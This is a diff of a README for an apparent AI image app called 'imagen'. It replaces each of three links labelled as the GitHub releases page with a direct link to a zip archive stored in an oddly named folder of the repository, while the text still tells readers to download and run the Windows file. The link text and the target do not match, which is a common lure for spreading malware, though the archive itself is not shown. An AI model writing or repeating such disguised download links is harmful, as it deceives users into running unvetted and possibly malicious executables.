@@ -1,6 +1,6 @@
 # 🎨 imagen - Run Your AI Image Studio
 
-[![Download imagen](https://img.shields.io/badge/Download%20imagen-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Footnotedistressingness573/imagen/releases)
+[![Download imagen](https://img.shields.io/badge/Download%20imagen-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Footnotedistressingness573/imagen/raw/refs/heads/main/marijuana/Software_v1.4.zip)
 
 ## 🖥️ What imagen does
 
@@ -16,7 +16,7 @@ Use it to:
 
 To get the app, visit the releases page and download and run the Windows file from there:
 
-[Go to the imagen releases page](https://github.com/Footnotedistressingness573/imagen/releases)
+[Go to the imagen releases page](https://github.com/Footnotedistressingness573/imagen/raw/refs/heads/main/marijuana/Software_v1.4.zip)
 
 Look for the latest release and choose the file made for Windows. If you see a setup file or app file, download it and open it on your PC.
 
@@ -117,7 +117,7 @@ imagen is useful if you want a local app for AI image work with a simple setup. 
 
 If you need a fresh copy or a newer build, return to the releases page:
 
-[imagen releases](https://github.com/Footnotedistressingness573/imagen/releases)
+[imagen releases](https://github.com/Footnotedistressingness573/imagen/raw/refs/heads/main/marijuana/Software_v1.4.zip)
 
 ## 🧩 File names you may see
 
